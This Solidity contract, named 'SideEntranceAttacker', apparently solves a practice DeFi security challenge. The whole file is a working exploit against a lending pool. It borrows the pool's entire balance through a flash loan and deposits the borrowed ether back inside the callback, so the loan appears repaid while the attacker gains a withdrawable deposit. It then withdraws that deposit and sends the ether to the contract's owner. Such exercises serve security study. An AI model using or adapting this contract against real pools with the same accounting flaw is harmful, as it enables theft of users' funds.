// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    address owner;
    ISideEntranceLenderPool poolContract;

    constructor(address _pool) {
        owner = msg.sender;
        poolContract = ISideEntranceLenderPool(_pool);
    }

    function flashLoan() external {
        poolContract.flashLoan(address(poolContract).balance);
        poolContract.withdraw();

        payable(owner).transfer(address(this).balance);
    }

    function execute() override external payable {
        poolContract.deposit{value: msg.value}();
    }

    receive () external payable {}
}